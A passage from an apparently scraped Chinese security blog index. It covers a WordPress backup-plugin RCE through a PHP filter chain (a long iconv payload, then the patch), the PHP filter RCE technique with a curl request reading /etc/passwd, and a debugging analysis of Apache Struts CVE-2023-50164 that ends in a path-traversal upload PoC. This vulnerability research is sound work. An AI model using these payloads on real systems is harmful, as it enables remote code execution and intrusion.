t.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp Content-Length: 3 小结 虽然只能控制require后面的路径参数，由于PHP的动态性以及PHP filter的灵活性，攻击者可以通过PHP filter构造特殊的iconv 编码链让require获取到构造的恶意代码并执行。\n其利用各种编码的RFC规定的特性来预置字符，是这个漏洞中最有意思的地方。\n补丁分析\n补丁中新增了filterChainFix函数，过滤请求头中的ABSPATH和BMI_ROOT_DIR，这个函数通过过滤PHP、|等并且严格限制参数长度来预防这个漏洞利用。\n31\t// Filter and prevent PHP filter injection 32\tfunction filterChainFix($content) { 33 34\t// Make sure it exist and is string 35\tif (!is_string($content)) die(\u0026#34;Incorrect parameters.\u0026#34;); 36 37\t// Check if it\u0026#39;s not larger than max allowed path length (default systems) 38\tif (strlen($content) \u0026gt; 256) die(\u0026#34;Incorrect parameters.\u0026#34;); 39 40\t// Check if the path does not contain \u0026#34;php:\u0026#34; 41\tif (strpos($content, \u0026#34;php:\u0026#34;)) die(\u0026#34;Incorrect parameters.\u0026#34;); 42 43\t// Check if the path contain \u0026#34;|\u0026#34;, it\u0026#39;s not possible to use this character with our backups paths 44\tif (strpos($content, \u0026#34;|\u0026#34;)) die(\u0026#34;Incorrect parameters.\u0026#34;); 45 46\t// Check if the directory/file exist otherwise fail 47\tif (!(is_dir($content) || file_exists($content))) die(\u0026#34;Incorrect parameters.\u0026#34;); 48 49\t// Return correct content 50\treturn $content; 51 52\t} 参考链接\nhttps://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution\nhttps://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it\nhttps://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution\nCreated at 2023-12-29T18:43:31+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/tags/php/","title":"PHP","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/research/web/php-filter-rce/","title":"PHP Filter RCE","tags":["安全研究","PHP"],"description":"","content":"PHP filter是什么 PHP filter是PHP定义的一个伪协议，用于在数据流打开时进行筛选过滤，在数据读取或者写入的时候通过过滤器对数据进行处理。PHP filter 可以使用多个过滤器进行处理。\nphp://filter/过滤器|过滤器/resource=待过滤的数据流 require_once和require的参数是一个文件路径，指明要包含的文件，而PHP filter 提供了接口，使得可以通过这个接口访问到指定的文件内容，require在包含文件时，只关心文件内容，而不关心文件内容来自于何处，所以可以给require 传PHP filter参数，\n如果有如下代码\n\u0026lt;?php $file = $_GET[\u0026#39;page\u0026#39;]; require($file); 则可以通过如下请求泄露敏感信息\ncurl \u0026#34;http://localhost/test.php?page=php://filter/convert.base64-encode/resource=/etc/passwd\u0026#34; PHP的base64decode函数在处理base64编码的数据时，会自动规范化：去除字符串中不合法的字符并且忽略，而后尝试解码。 但PHP filter的base64解码行为和base64decode行为略有不同，PHP filter的base64-decode不能处理随即插入的等号，此时可以使用UTF-7编码规避，UTF-7编码会把等号转化为其他的base64字符。\n通过编码前置字符 根据官网链接的\rreference 根据文档，如果开启了iconv支持，则可以通过伪协议php://convert.iconv.*.*调用iconv函数。\nconvert.iconv.\u0026lt;input-encoding\u0026gt;.\u0026lt;output-encoding\u0026gt; or convert.iconv.\u0026lt;input-encoding\u0026gt;/\u0026lt;output-encoding\u0026gt;\nlinux中可以使用iconv函数将字符串从一个编码转为另外一个编码，在PHP://filter中可以使用iconv过滤器调用到这个函数\nphp -r \u0026#34;echo file_get_contents(\\\u0026#34;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/res ource=php://temp\\\u0026#34;);\u0026#34; GyQpQw+AD0APQ-# 某些编码规定该编码会在数据之前预置一些字节，相当于签名，标识这段数据是该编码 在\rRFC 2781中就说明该编码会预置0XFEFF\nThe Unicode Standard and ISO 10646 define the character \u0026ldquo;ZERO WIDTH NON-BREAKING SPACE\u0026rdquo; (0xFEFF), which is also known informally as \u0026ldquo;BYTE ORDER MARK\u0026rdquo; (abbreviated \u0026ldquo;BOM\u0026rdquo;).This usage, suggested by Unicode and ISO 10646 Annex F (informative), is to prepend a 0xFEFF character to a stream of Unicode characters as a \u0026ldquo;signature\u0026rdquo;; a receiver of such a serialized stream may then use the initial character both as a hint that the stream consists of Unicode characters and as a way to recognize the serialization order. In serialized UTF-16 prepended with such a signature, the order is big-endian if the first two octets are 0xFE followed by 0xFF; if they are 0xFF followed by 0xFE, the order is little-endian. Note that 0xFFFE is not a Unicode character, precisely to preserve the usefulness of 0xFEFF as a byte-order mark.\n下图给出了如何在字符串前面预置8\n首先将UTF-8格式的字符串start转化为UTF-16格式 UTF-16会在字符串前面预置0xFFFE 前面预置的0xFF在LATIN6表中对应于ĸ 而后尝试将这个字符串以LATIN6格式转化为UTF-16格式 UTF-16会在字符串前面预置0xFFFE，ĸ在UNICODE表中对应于0x0138，而后逐个打印，0x38变成了8 LANTIN6表如下：\nx0 x1 x2 x3 x4 x5 x6 x7 x8 x9 xA xB xC xD xE xF 0x 1x 2x SP ! \u0026quot; # $ % \u0026amp; ' ( ) * + , - . / 3x 0 1 2 3 4 5 6 7 8 9 : ; \u0026lt; = \u0026gt; ? 4x @ A B C D E F G H I J K L M N O 5x P Q R S T U V W X Y Z [ |] ^ _ 6x ` a b c d e f g h i j k l m n o 7x p q r s t u v w x y z { | } ~ 8x 9x Ax NBSP Ą Ē Ģ Ī Ĩ Ķ § Ļ Đ Š Ŧ Ž SHY Ū Ŋ Bx ° ą ē ģ ī ĩ ķ · ļ đ š ŧ ž ― ū ŋ Cx Ā Á Â Ã Ä Å Æ Į Č É Ę Ë Ė Í Î Ï Dx Ð Ņ Ō Ó Ô Õ Ö Ũ Ø Ų Ú Û Ü Ý Þ ß Ex ā á â ã ä å æ į č é ę ë ė í î ï Fx ð ņ ō ó ô õ ö ũ ø ų ú û ü ý þ ĸ UNICODE如下： 通过将恶意代码转化为base64形式，而后通过编码预置字符，最后使用convert.base64-decode尝试解码预置的数据，就可以使得PHP filter最后解码出恶意代码。\n当使用require时，且路径可控，就可以利用PHP filter执行任意代码。\n参考链接\nhttps://gynvael.coldwind.pl/?id=671 https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it\nCreated at 2023-12-29T18:32:43+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/","title":"CVE 2023 50164 Apache Struts RCE","tags":["漏洞分析"],"description":"","content":"基本信息 由于 Struts 框架在处理参数名称大小写方面的不一致性，导致未经身份验证的远程攻击者能够通过修改参数名称的大小写来利用目录遍历技术上传恶意文件到服务器的非预期位置，最终导致代码执行。\n影响版本 2.0.0\u0026lt;= Struts \u0026lt;= 2.3.37 2.5.0 \u0026lt;= Struts \u0026lt;= 2.5.32 6.0.0 \u0026lt;= Struts \u0026lt;= 6.3.0 环境搭建 使用vulhub起一个docker环境即可。\n技术分析\u0026amp;调试 查看\r补丁可知，补丁修复前对于文件名超过maxStringLength时会将错误消息和context添加到errors之后直接返回，不会执行删除临时文件的逻辑，在修复代码中在finally语句中执行item.delete来删除临时文件。\nparams.put(item.getFieldName(), values); item.delete(); 在\rcommit d8c69691ef1d15e76a5f4fcf33039316da2340b6中主要有如下几个修复逻辑： 对于appendAll方法在添加参数之前先使用remove方法移除先前的参数。 对于get方法，修改为对大小写不敏感 而remove方法和contains方法有如下修改： 原先的remove方法会区分大小写，而修复后，remove方法从entrySet中忽略大小写并删除对应的项。 可以看出这个commit主要是将键值对获取/移除的方法修改为大小写不敏感。\n测试单元代码如下，添加了两个单元测试方法\nshouldGetBeCaseInsensitive shouldAppendSameParamsIgnoringCase shouldGetBeCaseInsensitive测试HttpParameters.get方法是否是大小写不敏感。 shouldAppendSameParamsIgnoringCase测试使用HttpParameters.appendAll向Map里面添加键值对时是否对key大小写不敏感。 可知修复主要是使得HttpParameters类的一些方法从大小写敏感改为大小写不敏感。 可以看出补丁主要是对HttpParameters进行修复。 public class HttpParametersTest { @Test public void shouldGetBeCaseInsensitive() { // given HttpParameters params = HttpParameters.create(new HashMap\u0026lt;String, Object\u0026gt;() {{ put(\u0026#34;param1\u0026#34;, \u0026#34;value1\u0026#34;); }}).build(); // then assertEquals(\u0026#34;value1\u0026#34;, params.get(\u0026#34;Param1\u0026#34;).getValue()); assertEquals(\u0026#34;value1\u0026#34;, params.get(\u0026#34;paraM1\u0026#34;).getValue()); assertEquals(\u0026#34;value1\u0026#34;, params.get(\u0026#34;pAraM1\u0026#34;).getValue()); } @Test public void shouldAppendSameParamsIgnoringCase() { // given HttpParameters params = HttpParameters.create(new HashMap\u0026lt;String, Object\u0026gt;() {{ put(\u0026#34;param1\u0026#34;, \u0026#34;value1\u0026#34;); }}).build(); // when assertEquals(\u0026#34;value1\u0026#34;, params.get(\u0026#34;param1\u0026#34;).getValue()); params = params.appendAll(HttpParameters.create(new HashMap\u0026lt;String, String\u0026gt;() {{ put(\u0026#34;Param1\u0026#34;, \u0026#34;Value1\u0026#34;); }}).build()); // then assertTrue(params.contains(\u0026#34;param1\u0026#34;)); assertTrue(params.contains(\u0026#34;Param1\u0026#34;)); assertEquals(\u0026#34;Value1\u0026#34;, params.get(\u0026#34;param1\u0026#34;).getValue()); assertEquals(\u0026#34;Value1\u0026#34;, params.get(\u0026#34;Param1\u0026#34;).getValue()); } } 查看struts代码交叉引用，可知appendAll在如下Interceptor上有引用 在strutsl的struts-default.xml里面定义了默认的interceptor，其中文件上传由FileUploadInterceptor拦截请求。\n\u0026lt;interceptor name=\u0026#34;fileUpload\u0026#34; class=\u0026#34;org.apache.struts2.interceptor.FileUploadInterceptor\u0026#34;/\u0026gt; 动态调试 发送如下请求，并在org.apache.struts2.interceptor.FileUploadIntercepto#intercept断点：\nPOST /upload.action HTTP/1.1 Host: 127.0.0.1 Accept: */* Accept-Encoding: gzip, deflate Content-Length: 400 Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 --------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN Content-Disposition: form-data; name=\u0026#34;Upload\u0026#34;; filename=\u0026#34;1.txt\u0026#34; Content-Type: text/plain 1aaa --------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN 在调试器中可以看到inputName为表单中name参数对应的值，struts会尝试根据inputName获取content type和fileName，。 跟进multiWrapper.getFileNames分发中，在org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#getFileNames中实现，代码如下\npublic String[] getFileNames(String fieldName) { List\u0026lt;FileItem\u0026gt; items = (List)this.files.get(fieldName); if (items == null) { return null; } else { List\u0026lt;String\u0026gt; fileNames = new ArrayList(items.size()); Iterator var4 = items.iterator(); while(var4.hasNext()) { FileItem fileItem = (FileItem)var4.next(); fileNames.add(this.getCanonicalName(fileItem.getName())); } return (String[])fileNames.toArray(new String[fileNames.size()]); } } 跟进getCanonicalName方法内，在getCanonicalName方法内获取了斜杠和反斜杠的位置，如果不为-1的话则会对文件名进行截断，取到最后一个斜杠后面的字符串作为文件名，防止目录穿越。\n回到intercept方法中，在后面会拼接inputName组成contentTypeName和fileNameName作为Map的key，并将获取到的contentType和fileName作为value加入到HashMap中，而后通过appenAll方法将HashMap添加到HttpParameter中 在FileInterceptor获取到参数之后需要将参数通过Action的setter方法绑定到Action中的变量上。 在定义的action中的set方法断点，重新调试，发送恶意请求，调试器中主要调用栈如下：\nsetUpload:27, UploadAction (org.chestnut.action) invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect) invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect) invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect) invoke:567, Method (java.lang.reflect) invokeMethodInsideSandbox:1245, OgnlRuntime (ognl) invokeMethod:1230, OgnlRuntime (ognl) callAppropriateMethod:1958, OgnlRuntime (ognl) setMethodValue:2196, OgnlRuntime (ognl) setPossibleProperty:98, ObjectPropertyAccessor (ognl) setProperty:175, ObjectPropertyAccessor (ognl) setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor) setProperty:3359, OgnlRuntime (ognl) setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor) setProperty:3359, OgnlRuntime (ognl) setValueBody:134, ASTProperty (ognl) evaluateSetValueBody:220, SimpleNode (ognl) setValue:308, SimpleNode (ognl) setValue:829, Ognl (ognl) lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl) execute:-1, 769172083 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$369) compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl) setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl) trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl) setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl) setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl) setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor) doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor) intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor) executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2) invoke:253, DefaultActionInvocation (com.opensymphony.xwork2) doIntercept:152, ParametersInterceptor (com.opensymphony.xwork2.interceptor) intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor) executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2) invoke:253, DefaultActionInvocation (com.opensymphony.xwork2) intercept:202, StaticParametersInterceptor (com.opensymphony.xwork2.interceptor) 在com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters方法中尝试将parameters的每个键值对通过参数绑定调用Action的setter方法。\n获取setter方法的逻辑 参数绑定需要获取Action中的方法并调用，在Action中对应方法下断点，可以得到如下调用栈\nsetUpload:27, UploadAction (org.chestnut.action) invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect) invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect) invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect) invoke:567, Method (java.lang.reflect) invokeMethodInsideSandbox:1245, OgnlRuntime (ognl) invokeMethod:1230, OgnlRuntime (ognl) callAppropriateMethod:1958, OgnlRuntime (ognl) setMethodValue:2196, OgnlRuntime (ognl) setPossibleProperty:98, ObjectPropertyAccessor (ognl) setProperty:175, ObjectPropertyAccessor (ognl) setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor) setProperty:3359, OgnlRuntime (ognl) setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor) setProperty:3359, OgnlRuntime (ognl) setValueBody:134, ASTProperty (ognl) evaluateSetValueBody:220, SimpleNode (ognl) setValue:308, SimpleNode (ognl) setValue:829, Ognl (ognl) lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl) execute:-1, 2098738059 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$371) compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl) setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl) trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl) setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl) setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl) setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor) doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor) intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor) executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2) invoke:253, DefaultActionInvocation (com.opensymphony.xwork2) doIntercept:152, ParametersInterceptor (com.opensymphony.xwork2.interceptor) intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor) executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2) invoke:253, DefaultActionInvocation (com.opensymphony.xwork2) intercept:202, StaticParametersInterceptor (com.opensymphony.xwork2.interceptor) 在setMethodValue:2178, OgnlRuntime (ognl)断点，重新发送请求，跟进getSetMethod方法查看获取setter方法的逻辑\n在getSetMethod方法中会尝试从缓存取出Upload对应的方法，如果取出的method不为null则会返回，如果为null则会尝试调用_getSetMethod方法从目标class中通过反射拼接get从目标class中获取到方法。\npublic static Method getSetMethod(OgnlContext context, Class targetClass, String propertyName) throws IntrospectionException, OgnlException { Method method = cacheSetMethod.get(targetClass, propertyName); if (method == OgnlRuntime.ClassPropertyMethodCache.NULL_REPLACEMENT) { return null; } else if (method != null) { return method; } else { method = _getSetMethod(context, targetClass, propertyName); cacheSetMethod.put(targetClass, propertyName, method); return method; } } // 参数 this.arg$3 = \u0026#39;this\u0026#39; is not available context = {OgnlContext@6991} size = 7 targetClass = {Class@6029} \u0026#34;class org.chestnut.action.UploadAction\u0026#34; propertyName = \u0026#34;Upload\u0026#34; method = {Method@6987} \u0026#34;public void org.chestnut.action.UploadAction.setUpload(java.io.File)\u0026#34; 在_getSetMethod方法中会调用getDeclaredMethods方法获取目标class中定义的指定方法，目标方法通过propertyName指定，getDeclaredMethods会调用collectAccessors方法\nprivate static Method _getSetMethod(OgnlContext context, Class targetClass, String propertyName) throws IntrospectionException, OgnlException { Method result = null; List methods = getDeclaredMethods(targetClass, propertyName, true); public static List getDeclaredMethods(Class targetClass, String propertyName, boolean findSets) { List result = null; ClassCache cache = _declaredMethods[findSets ? 0 : 1]; Map propertyCache = (Map)cache.get(targetClass); if (propertyCache == null || (result = (List)propertyCache.get(propertyName)) == null) { synchronized(cache) { Map propertyCache = (Map)cache.get(targetClass); if (propertyCache == null || (result = (List)((Map)propertyCache).get(propertyName)) == null) { String baseName = capitalizeBeanPropertyName(propertyName); List result = new ArrayList(); collectAccessors(targetClass, baseName, result, findSets); ..... return result == NotFoundList ? null : result; } 在collectAccessors方法中首先通过反射获取到目标class的所有方法，而后遍历所有方法，并传入addIfAccessor方法中。 addIfAccessor会首先判断传入的方法名是否以目标名字结尾，通过判断后会通过拼接get/set/is来判断是否是目标方法，由于传入的findSets是true，所以会找到setMethodName方法最终得到setUpload方法 private static void collectAccessors(Class c, String baseName, List result, boolean findSets) { Method[] methods; try { methods = c.getDeclaredMethods(); } catch (SecurityException var10) { methods = c.getMethods(); } for(int i = 0; i \u0026lt; methods.length; ++i) { if (c.isInterface()) { if (isDefaultMethod(methods[i]) || isNonDefaultPublicInterfaceMethod(methods[i])) { addIfAccessor(result, methods[i], baseName, findSets); } } else if (isMethodCallable(methods[i])) { addIfAccessor(result, methods[i], baseName, findSets); } } Class superclass = c.getSuperclass(); if (superclass != null) { collectAccessors(superclass, baseName, result, findSets); } Class[] var6 = c.getInterfaces(); int var7 = var6.length; for(int var8 = 0; var8 \u0026lt; var7; ++var8) { Class iface = var6[var8]; collectAccessors(iface, baseName, result, findSets); } } private static void addIfAccessor(List result, Method method, String baseName, boolean findSets) { String ms = method.getName(); if (ms.endsWith(baseName)) { boolean isSet = false; boolean isIs = false; if ((isSet = ms.startsWith(\u0026#34;set\u0026#34;)) || ms.startsWith(\u0026#34;get\u0026#34;) || (isIs = ms.startsWith(\u0026#34;is\u0026#34;))) { int prefixLength = isIs ? 2 : 3; if (isSet == findSets \u0026amp;\u0026amp; baseName.length() == ms.length() - prefixLength) { result.add(method); } } } } getSetMethod获取到方法后，会通过cacheSetMethod.put(targetClass, propertyName, method);保存到缓存内。 而后再次调用时，可以获取到setUpload方法最终通过invokeMethod方法调用。 而对于恶意参数uploadFileName，由于缓存中没有uploadFileName，所以会尝试通过_getSetMethod获取对应的set方法。 这里碰到了一个坑，众所周知Action中方法名为setUploadFileName对应于endwith UploadFileName，而uploadFileName 显然不满足条件，按道理在addIfAccessor方法中应该获取不到对应的set方法才是，反常的是其反而获取到了，在重新调试，才发现在getDeclaredMethods调用collectAccessors方法之前，传入的baseName参数已经变成了UploadFileName，满足前面的条件，获取到了get方法。 很明显，baseName由capitalizeBeanPropertyName方法返回得到\n查看capitalizeBeanPropertyName方法，传入的propertyName为uploadFileName\nprivate static String capitalizeBeanPropertyName(String propertyName) { if (propertyName.length() == 1) { return propertyName.toUpperCase(); } else if (propertyName.startsWith(\u0026#34;get\u0026#34;) \u0026amp;\u0026amp; propertyName.endsWith(\u0026#34;()\u0026#34;) \u0026amp;\u0026amp; Character.isUpperCase(propertyName.substring(3, 4).charAt(0))) { return propertyName; } else if (propertyName.startsWith(\u0026#34;set\u0026#34;) \u0026amp;\u0026amp; propertyName.endsWith(\u0026#34;)\u0026#34;) \u0026amp;\u0026amp; Character.isUpperCase(propertyName.substring(3, 4).charAt(0))) { return propertyName; } else if (propertyName.startsWith(\u0026#34;is\u0026#34;) \u0026amp;\u0026amp; propertyName.endsWith(\u0026#34;()\u0026#34;) \u0026amp;\u0026amp; Character.isUpperCase(propertyName.substring(2, 3).charAt(0))) { return propertyName; } else { char first = propertyName.charAt(0); char second = propertyName.charAt(1); if (Character.isLowerCase(first) \u0026amp;\u0026amp; Character.isUpperCase(second)) { return propertyName; } else { char[] chars = propertyName.toCharArray(); chars[0] = Character.toUpperCase(chars[0]); return new String(chars); } } } 忽略前面的if，在最后一个else中，如果第一个字符是小写，第二个字符是大写则会直接返回，否则会将第一个字符变为大写，所以uploadFileName在经过处理后会变为UploadFileName，所以在后面可以通过addIfAccessor里面的判断，获取到setUploadFileName方法。\n也就是说会调用两次setUploadFileName方法，而Map中大写的key排在小写的key前面，所以首先会获取到经过目录穿越过滤器过滤的的正确的UploadFileName并通过setUploadFileName方法设置到action中的UploadFileName属性中 而后会设置uploadFileName的参数，而该参数不会经过目录穿越过滤器，也就是这个属性可以通过../进行目录穿越，而后再次调用 setUploadFileName方法action中的UploadFileName属性中，完成了变量覆盖。\nPoC\nPOST /upload.action HTTP/1.1 Host: 127.0.0.1 Accept: */* Accept-Encoding: gzip, deflate Content-Length: 400 Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 --------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN Content-Disposition: form-data; name=\u0026#34;Upload\u0026#34;; filename=\u0026#34;1.txt\u0026#34; Content-Type: text/plain 1aaa --------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN Content-Disposition: form-data; name=\u0026#34;uploadFileName\u0026#34;; Content-Type: text/plain ../123.jsp 